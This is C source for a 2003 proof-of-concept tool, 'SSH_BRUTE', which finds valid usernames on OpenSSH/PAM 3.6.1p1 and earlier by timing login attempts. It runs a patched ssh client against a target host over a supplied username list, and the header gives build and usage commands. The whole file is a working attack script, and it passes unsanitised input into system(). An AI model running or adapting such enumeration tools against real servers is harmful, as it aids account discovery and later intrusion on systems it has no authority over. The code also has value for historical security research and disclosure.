/*
 * SSH_BRUTE - OpenSSH/PAM <= 3.6.1p1 remote users discovery tool
 * Copyright (c) 2003 @ Mediaservice.net Srl. All rights reserved
 *
 * THIS IS PROPRIETARY SOURCE CODE OF @MEDIASERVICE.NET, DO NOT DISTRIBUTE.
 *
 * Vulnerability discovered by Marco Ivaldi <raptor@mediaservice.net>
 * Proof of concept code by Maurizio Agazzini <inode@mediaservice.net>
 *
 * Tested against Red Hat, Mandrake, and Debian GNU/Linux.
 *
 * Reference: http://lab.mediaservice.net/advisory/2003-01-openssh.txt
 *
 * $ tar xvfz openssh-3.6.1p1.tar.gz
 * $ patch -p0 <openssh-3.6.1p1_brute.diff 
 * patching file openssh-3.6.1p1/ssh.c
 * patching file openssh-3.6.1p1/sshconnect.c
 * patching file openssh-3.6.1p1/sshconnect1.c
 * patching file openssh-3.6.1p1/sshconnect2.c
 * $ cd openssh-3.6.1p1
 * $ ./configure
 * $ make
 * $ cc ../ssh_brute.c -o ssh_brute
 * $ ./ssh_brute 1 list.txt 192.168.0.66
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>

/* an illegal user */
#define NO_USER "not_val_user"

/* path of the patched ssh */
#define PATH_SSH "./ssh"

/* max time range for invalid user */
#define TIME_RANGE 3 

int main(int argc, char *argv[])
{
	FILE * in;
	char buffer[2000], username[100], *host;
	int time_non_valid = 0, time_user = 0;	
	int version = 1, i = 0, ret;

	fprintf(stderr, "\n SSH_BRUTE - OpenSSH/PAM <= 3.6.1p1 remote users discovery tool\n");
	fprintf(stderr, " Copyright (c) 2003 @ Mediaservice.net Srl. All rights reserved\n"); 

	if (argc < 3) {
		fprintf(stderr, "\n Usage: %s <protocol version> <user file> <host>\n\n", argv[0]);
		exit(-1);
	}

        version = atoi(argv[1]);
        host = argv[3];

	if ( ( in = fopen(argv[2], "r") ) == NULL ) {
		fprintf(stderr, "\n Can't open %s\n", argv[2]);
		exit(-1);
	}

	/* test an illegal user */
	printf("\n Testing an illegal user\t: ");
	fflush(stdout);
	
	sprintf(buffer, "%s -%d %s@%s", PATH_SSH, version, NO_USER, host);

	for (i = 0; i < 3; i++) {
		ret = system(buffer);
		time_non_valid += WEXITSTATUS(ret);
	}

	time_non_valid /= 3;

	printf("%d second(s)\n\n", time_non_valid);

	time_non_valid += TIME_RANGE;

	/* test supplied users */
 	fscanf(in, "%s", username);

	while ( !feof(in) ) {
		
		printf(" Testing login %s\t", username);

		if (strlen(username) <= 8)
			printf("\t");
		printf(": ");

		fflush( stdout );

		sprintf(buffer, "%s -%d %s@%s", PATH_SSH, version, username, host);
		ret = system(buffer);
		time_user = WEXITSTATUS(ret);

		if (time_user <= time_non_valid) 
			printf("\E[31m\E[1mILLEGAL\E[m\t[%d second(s)]\n", time_user);
		else {
			/* valid user? test it again to be sure */

			ret = system(buffer);
			time_user = WEXITSTATUS(ret);

			if (time_user <= time_non_valid)
	                       printf("\E[31m\E[1mILLEGAL\E[m\t[%d second(s)] [2 test]\n", time_user);
			else
				printf("\E[32m\E[1mUSER OK\E[m\t[%d second(s)]\n", time_user);
		}

		fscanf(in, "%s", username);
	}
	
	fclose(in);
	
	printf("\n");

	exit(0);
}


